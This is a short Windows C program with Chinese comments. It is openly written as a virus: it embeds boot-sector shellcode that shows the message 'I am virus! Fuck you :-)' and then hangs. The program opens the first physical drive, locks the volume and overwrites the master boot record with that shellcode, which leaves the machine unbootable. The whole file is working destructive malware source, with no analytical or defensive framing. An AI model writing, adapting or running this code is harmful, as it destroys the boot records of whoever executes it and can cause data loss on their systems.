#include <windows.h>
#include <winioctl.h>

unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
/*
00000000  B81200 mov ax, 12H ; ah = 0, al = 12h (640 * 480)
00000003  CD10 int 10h ; 进入图形显示方式，隐藏光标
00000005  BD187C mov bp, Msg ; ES:BP = 串地址
00000008  B91800 mov cx, 18h ; CX = 串长度
0000000B  B80113 mov ax, 1301h ; AH = 13,  AL = 01h
0000000E  BB0C00 mov bx, 000ch ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
00000011  BA1D0E mov dx, 0e1dh ; dh行, dl列
00000014  CD10 int 10h ; 10h 号中断
00000016  E2FE loop $
Msg: db "I am virus! Fuck you :-)"
*/
int WINAPI WinMain(
  HINSTANCE hInstance,  // handle to current instance
  HINSTANCE hPrevInstance,  // handle to previous instance
  LPSTR lpCmdLine,      // pointer to command line
  int nCmdShow          // show state of window
)
{
HANDLE hDevice;
DWORD dwBytesWritten, dwBytesReturned;
BYTE pMBR[512] = {0};

// 重新构造MBR
memcpy(pMBR, scode, sizeof(scode) - 1);
pMBR[510] = 0x55;
pMBR[511] = 0xAA;

hDevice = CreateFile
(
"\\\\.\\PHYSICALDRIVE0",
GENERIC_READ | GENERIC_WRITE,
FILE_SHARE_READ | FILE_SHARE_WRITE,
NULL,
OPEN_EXISTING,
0,
NULL
);
if (hDevice == INVALID_HANDLE_VALUE)
  return -1;
DeviceIoControl
(
hDevice,
FSCTL_LOCK_VOLUME,
NULL,
0,
NULL,
0,
&dwBytesReturned,
NULL
);
// 写入病毒内容
WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
DeviceIoControl
(
hDevice,
FSCTL_UNLOCK_VOLUME,
NULL,
0,
NULL,
0,
&dwBytesReturned,
NULL
);
CloseHandle(hDevice);
return 0;
}
